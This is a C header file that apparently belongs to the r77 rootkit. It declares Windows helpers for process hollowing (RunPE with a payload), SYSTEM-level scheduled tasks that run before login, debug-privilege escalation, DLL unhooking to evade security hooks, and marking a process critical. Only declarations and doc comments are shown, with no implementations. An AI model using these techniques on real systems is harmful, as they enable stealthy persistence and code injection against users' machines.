#include "r77mindef.h"
#ifndef _R77WIN_H
#define _R77WIN_H

/// <summary>
/// Writes random bytes to the buffer.
/// </summary>
/// <param name="buffer">A buffer to write the random data to.</param>
/// <param name="size">The size in bytes of random data to write.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetRandomBytes(LPVOID buffer, DWORD size);
/// <summary>
/// Generates a random alphanumeric string.
/// </summary>
/// <param name="str">A buffer of unicode characters to write the string to.</param>
/// <param name="length">The number of characters to write.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetRandomString(PWCHAR str, DWORD length);
/// <summary>
/// Converts a LPCWSTR into a null terminated LPCSTR.
/// </summary>
/// <param name="str">The LPCWSTR to convert.</param>
/// <returns>
/// A newly allocated LPCSTR with the converted LPCWSTR.
/// </returns>
LPCSTR ConvertStringToAString(LPCWSTR str);
/// <summary>
/// Converts a UNICODE_STRING into a null terminated LPWSTR.
/// </summary>
/// <param name="str">The UNICODE_STRING to convert.</param>
/// <returns>
/// A newly allocated LPWSTR with the converted UNICODE_STRING.
/// </returns>
LPWSTR ConvertUnicodeStringToString(UNICODE_STRING str);
/// <summary>
/// Converts a 32-bit integer value to a string.
/// </summary>
/// <param name="value">The value to convert.</param>
/// <param name="buffer">A buffer of unicode characters to write the result to.</param>
VOID Int32ToStrW(LONG value, PWCHAR buffer);

/// <summary>
/// Determines whether the operating system is a 64-bit operating system.
/// </summary>
/// <returns>
/// TRUE, if the operating system is a 64-bit operating system;
/// otherwise, FALSE.
/// </returns>
BOOL Is64BitOperatingSystem();
/// <summary>
/// Determines whether at Windows 10 or greater is installed. This function uses the NT API and does not rely on a manifest file.
/// </summary>
/// <returns>
/// TRUE, if Windows 10 or above is installed;
/// otherwise, FALSE.
/// </returns>
BOOL IsAtLeastWindows10();
/// <summary>
/// Determines whether a process is a 64-bit process.
/// </summary>
/// <param name="processId">The process ID to check.</param>
/// <param name="is64Bit">A pointer to a BOOL value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit);
/// <summary>
/// Retrieves a function from a DLL specified by a name.
/// </summary>
/// <param name="dll">The name of the DLL to retrieve the function from.</param>
/// <param name="function">The name of the function to retrieve.</param>
/// <returns>
/// A pointer to the function, or NULL, if either the DLL was not found or does not have a function by the specified name.
/// </returns>
LPVOID GetFunction(LPCSTR dll, LPCSTR function);
/// <summary>
/// Gets the integrity level of a process.
/// </summary>
/// <param name="process">The process ID to check.</param>
/// <param name="integrityLevel">A pointer to a DWORD value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessIntegrityLevel(HANDLE process, LPDWORD integrityLevel);
/// <summary>
/// Gets the filename or the full path of a process.
/// </summary>
/// <param name="processId">The process ID to retrieve the filename or full path from.</param>
/// <param name="fullPath">TRUE to return the full path, FALSE to return only the filename.</param>
/// <param name="fileName">A buffer to write the filename or full path to.</param>
/// <param name="fileNameLength">The length of the fileName buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessFileName(DWORD processId, BOOL fullPath, LPWSTR fileName, DWORD fileNameLength);
/// <summary>
/// Gets the username of a process.
/// </summary>
/// <param name="process">The handle to the process to check.</param>
/// <param name="name">A buffer of unicode characters to write the result to.</param>
/// <param name="nameLength">The length of the result buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetProcessUserName(HANDLE process, PWCHAR name, LPDWORD nameLength);
/// <summary>
/// Obtains the SeDebugPrivilege.
/// </summary>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL EnabledDebugPrivilege();
/// <summary>
/// Gets an executable resource.
/// </summary>
/// <param name="resourceID">The identifier of the resource.</param>
/// <param name="type">The type identifier of the resource.</param>
/// <param name="data">A pointer that is set to a newly allocated buffer with the resource data.</param>
/// <param name="size">A pointer to a DWORD value to write the size of the returned buffer to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetResource(DWORD resourceID, PCSTR type, LPBYTE *data, LPDWORD size);
/// <summary>
/// Retrieves the full path from a file handle.
/// </summary>
/// <param name="file">A file handle to retrieve the path from.</param>
/// <param name="fileName">A buffer to write the path to.</param>
/// <param name="fileNameLength">The length of the fileName buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL GetPathFromHandle(HANDLE file, LPWSTR fileName, DWORD fileNameLength);
/// <summary>
/// Reads the contents of a file.
/// </summary>
/// <param name="path">The path to the file to read.</param>
/// <param name="data">A pointer that is set to a newly allocated buffer with the file contents.</param>
/// <param name="size">A pointer to a DWORD value to write the size of the returned buffer to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size);
/// <summary>
/// Reads a null terminated LPCWSTR from the specified file.
/// </summary>
/// <param name="file">A file handle to read the string from.</param>
/// <param name="str">The buffer to write the string to.</param>
/// <param name="length">The length of the string buffer.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// FALSE, if the string was longer than the specified buffer, or the end of the file was reached before the null terminator.
/// </returns>
BOOL ReadFileStringW(HANDLE file, PWCHAR str, DWORD length);
/// <summary>
/// Writes a buffer to a file.
/// </summary>
/// <param name="path">The path to the file to create.</param>
/// <param name="data">A buffer to write to the file.</param>
/// <param name="size">The number of bytes to write.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size);
/// <summary>
/// Creates a file with a random filename and a given extension in the temp directory and writes a given buffer to it.
/// </summary>
/// <param name="file">A buffer to write to the file.</param>
/// <param name="fileSize">The number of bytes to write.</param>
/// <param name="extension">The extension to append to the random filename, excluding the dot.</param>
/// <param name="resultPath">A buffer of unicode characters to write the path of the created file to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL CreateTempFile(LPBYTE file, DWORD fileSize, LPCWSTR extension, LPWSTR resultPath);
/// <summary>
/// Executes a file and waits for the process to exit.
/// </summary>
/// <param name="path">The path to the file to execute.</param>
/// <param name="deleteFile">TRUE, to attempt to delete the file. A total of 10 deletion attempts with a delay of 100 ms is performed.</param>
/// <returns>
/// TRUE, if the file was successfully executed;
/// otherwise, FALSE.
/// If the file was executed, but deletion failed, TRUE is returned.
/// </returns>
BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile);
/// <summary>
/// Creates a scheduled task that is set to run under the SYSTEM account before the user logs in.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <param name="directory">The working directory of the scheduled task.</param>
/// <param name="fileName">The application name of the scheduled task.</param>
/// <param name="arguments">The commandline arguments to pass to the created process.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCWSTR arguments);
/// <summary>
/// Starts a scheduled task.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL RunScheduledTask(LPCWSTR name);
/// <summary>
/// Deletes a scheduled task.
/// </summary>
/// <param name="name">The name of the scheduled task.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL DeleteScheduledTask(LPCWSTR name);
/// <summary>
/// Creates a named pipe that is accessible by every process.
/// </summary>
/// <param name="name">The name of the named pipe to be created.</param>
/// <returns>
/// A handle to the newly created named pipe, or INVALID_HANDLE_VALUE, if creation failed.
/// </returns>
HANDLE CreatePublicNamedPipe(LPCWSTR name);

/// <summary>
/// Determines the bitness of an executable file.
/// </summary>
/// <param name="image">A buffer containing the executable file.</param>
/// <param name="is64Bit">A pointer to a BOOL value to write the result to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit);
/// <summary>
/// Creates a new process using the process hollowing technique.
/// <para>If the current process is a 32-bit process, only 32-bit processes can be created.</para>
/// </summary>
/// <param name="path">The target executable path. This can be any existing file with the same bitness as the payload.</param>
/// <param name="payload">The actual executable that is the payload of the new process, regardless of the path argument.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
BOOL RunPE(LPCWSTR path, LPBYTE payload);
/// <summary>
/// Converts an IMAGE_SECTION_HEADER.Characteristics flag to a memory page protection flag.
/// </summary>
/// <param name="characteristics">The characteristics of a section.</param>
/// <returns>
/// A DWORD value to be used with VirtualProtectEx.
/// </returns>
DWORD SectionCharacteristicsToProtection(DWORD characteristics);
/// <summary>
/// Gets the file offset of an exported function from an executable file.
/// </summary>
/// <param name="image">A buffer with the executable file.</param>
/// <param name="functionName">The name of the exported function.</param>
/// <returns>
/// The file offset of the exported function; or 0, if this function fails.
/// </returns>
DWORD GetExecutableFunction(LPBYTE image, LPCSTR functionName);
/// <summary>
/// Converts a RVA to a file offset.
/// </summary>
/// <param name="image">A buffer with the executable file.</param>
/// <param name="rva">The RVA to convert.</param>
/// <returns>
/// The file offset converted from the specified RVA; or 0, if this function fails.
/// </returns>
DWORD RvaToOffset(LPBYTE image, DWORD rva);
/// <summary>
/// Unhooks a DLL by replacing the .text section with the original DLL section.
/// </summary>
/// <param name="name">The name of the DLL to unhook.</param>
VOID UnhookDll(LPCWSTR name);

NTSTATUS NTAPI R77_NtQueryObject(HANDLE handle, OBJECT_INFORMATION_CLASS objectInformationClass, LPVOID objectInformation, ULONG objectInformationLength, PULONG returnLength);
NTSTATUS NTAPI R77_NtCreateThreadEx(PHANDLE thread, ACCESS_MASK desiredAccess, LPVOID objectAttributes, HANDLE processHandle, LPVOID startAddress, LPVOID parameter, ULONG flags, SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit, SIZE_T sizeOfStackReserve, LPVOID bytesBuffer);
NTSTATUS NTAPI R77_NtUnmapViewOfSection(HANDLE processHandle, LPVOID baseAddress);
NTSTATUS NTAPI R77_RtlGetVersion(PRTL_OSVERSIONINFOW versionInformation);
NTSTATUS NTAPI R77_RtlAdjustPrivilege(ULONG privilege, BOOLEAN enablePrivilege, BOOLEAN isThreadPrivilege, PBOOLEAN previousValue);
NTSTATUS NTAPI R77_RtlSetProcessIsCritical(BOOLEAN newIsCritical, PBOOLEAN oldIsCritical, BOOLEAN needScb);

#endif